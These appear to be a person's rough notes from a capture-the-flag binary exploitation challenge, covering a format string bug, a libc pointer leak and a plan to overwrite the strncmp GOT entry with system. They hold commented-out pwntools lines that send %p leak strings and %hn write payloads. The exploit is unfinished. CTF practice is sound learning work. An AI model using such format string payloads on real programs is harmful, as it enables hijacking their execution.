Another format string problem 
There is a pointer leak 
Calculate libc offset 
leak the canary with the format string as well?
Where is the arbitrary write coming from though?
fprintf also contains a format string vulnerability?
Need to write to lower n bytes and upper n bytes again 
This will be done in the fmt string thing 
Need two different leaks I think 
Write what where?
Write system? 


break up into two different chunks 
upper 4 bytes, lower 4 bytes
actually, upper bytes are nbasically the same so it's fine 

write @ strncmp address 
need to write 
each % thing in printf is an argument 

# Steps:
- [x] Leak libc  
- [ ] leak executable 
- [ ] overwrite got table address with something else?
    - system call maybe?
- [ ] write random value first instead of system 



""" l = r.recvline() """
""" print("l: ", l) """
""" print(r.recvline()) """
""" r.sendlineafter(">> ", p64(0x4141414142424242) + b" %p.%p.%p.%p.%p.%p.%p") """
# overwrite the lower 4 bytes to be system instead
""" lower_amnt_to_write = "%" + hex(lower - 8) + "x" """
""" r.sendlineafter(">> ", p64(strncmp_got) + lower_amnt_to_write.encode() + b"%5$hn") """



""" gdb.attach(r) """
""" time.sleep(1) """
""" prepend = b"%5$p.%6$p.%7$p.%8$p.%9$p.%10$p.%11$p.%12$p"  """
""" print("length: ", len(prepend)) """
""" r.sendlineafter(">> ", prepend + p64(strncmp_got)) """

""" r.sendlineafter(">> ", p64(strncmp_got) + b"%n") """
""" r.sendlineafter(">> ", p64(0x4141414142424242) + b"%5$p") """
# not readign the rest because of null bytes
# i think zero padding works?
# Okay so maybe call twice 

